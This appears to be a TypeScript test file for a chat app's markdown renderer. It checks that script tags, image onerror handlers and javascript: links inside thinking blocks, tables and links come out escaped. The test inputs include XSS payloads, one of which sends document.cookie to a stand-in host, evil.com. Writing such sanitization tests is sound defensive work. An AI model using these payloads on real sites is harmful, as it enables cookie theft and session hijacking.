import test from 'node:test';
import * as assert from 'node:assert';
import * as path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const mdPath = path.join(__dirname, '../../renderer/modules/chat/markdown.js');

interface MarkdownModule {
  renderMarkdown: (text: string) => string;
  renderMarkdownCached: (text: string) => string;
  escapeHtml: (text: string) => string;
}

let cached: MarkdownModule | null = null;
async function getMarkdown(): Promise<MarkdownModule> {
  if (!cached) cached = (await import(pathToFileURL(mdPath).href)) as MarkdownModule;
  return cached;
}

test('markdown renderer - sanitizes <script> in thinking blocks (XSS defense)', async () => {
  const { renderMarkdown } = await getMarkdown();

  // 1. Closed <think> tag with script
  const thoughtInput = '<think><script>alert("thinking-xss")</script></think>';
  const thoughtOutput = renderMarkdown(thoughtInput);

  assert.ok(thoughtOutput.includes('thought-accordion'), 'Should render thought accordion wrapper');
  assert.ok(thoughtOutput.includes('&lt;script&gt;alert(&quot;thinking-xss&quot;)&lt;/script&gt;'), 'Script inside think block must be HTML-escaped');
  assert.strictEqual(thoughtOutput.includes('<script>'), false, 'Raw <script> must NOT be emitted in thinking block');
  assert.strictEqual(thoughtOutput.includes('</script>'), false, 'Raw </script> must NOT be emitted in thinking block');

  // 2. Unclosed streaming <thinking> tag with script
  const streamingInput = '<thinking>Planning attack: <script>document.location="http://evil.com"</script>';
  const streamingOutput = renderMarkdown(streamingInput);
  assert.ok(streamingOutput.includes('&lt;script&gt;'), 'Streaming think tag must also escape <script>');
  assert.strictEqual(streamingOutput.includes('<script>'), false);
});

test('markdown renderer - sanitizes <script> and event handlers in table cells and headers', async () => {
  const { renderMarkdown } = await getMarkdown();

  // 1. Table cell containing <script>
  const tableWithScriptCell = `
| Command | Payload |
|---------|---------|
| inspect | <script>fetch("http://evil.com/steal?cookie="+document.cookie)</script> |
| safe    | normal data |
`;
  const cellOutput = renderMarkdown(tableWithScriptCell);
  assert.ok(cellOutput.includes('<table class="markdown-table">'), 'Should render table structure');
  assert.ok(cellOutput.includes('<td>&lt;script&gt;fetch(&quot;http://evil.com/steal?cookie=&quot;+document.cookie)&lt;/script&gt;</td>'), 'Table cell must escape script tag');
  assert.strictEqual(cellOutput.includes('<script>'), false, 'Raw <script> must NOT exist in table HTML');

  // 2. Table header containing <script>
  const tableWithScriptHeader = `
| <script>alert("header-xss")</script> | Status |
|--------------------------------------|--------|
| row1                                 | ok     |
`;
  const headerOutput = renderMarkdown(tableWithScriptHeader);
  assert.ok(headerOutput.includes('<th>&lt;script&gt;alert(&quot;header-xss&quot;)&lt;/script&gt;</th>'), 'Table header must escape script tag');
  assert.strictEqual(headerOutput.includes('<script>'), false, 'Raw <script> must NOT exist in header HTML');

  // 3. Stored image onerror in table cell
  const tableWithImgPayload = `
| Test | Result |
|------|--------|
| img  | <img src="x" onerror="alert(1)"> |
`;
  const imgOutput = renderMarkdown(tableWithImgPayload);
  assert.ok(imgOutput.includes('&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;'), 'Image injection in table must be escaped');
  assert.strictEqual(imgOutput.includes('<img src='), false, 'Raw <img> must NOT exist in table output');
});

test('markdown renderer - neutralizes javascript: protocol in markdown links', async () => {
  const { renderMarkdown } = await getMarkdown();

  const xssLink = '[Click here to exploit](javascript:alert(document.domain))';
  const linkOutput = renderMarkdown(xssLink);

  assert.strictEqual(linkOutput.includes('href="javascript:'), false, 'javascript: link must NOT be rendered as active hyperlink');
  assert.strictEqual(linkOutput.includes('<a href='), false, 'Dangerous link must degrade to plain text');

  const safeLink = '[Safe Link](https://example.com)';
  const safeOutput = renderMarkdown(safeLink);
  assert.ok(safeOutput.includes('<a href="https://example.com" target="_blank" rel="noopener noreferrer">Safe Link</a>'));
});
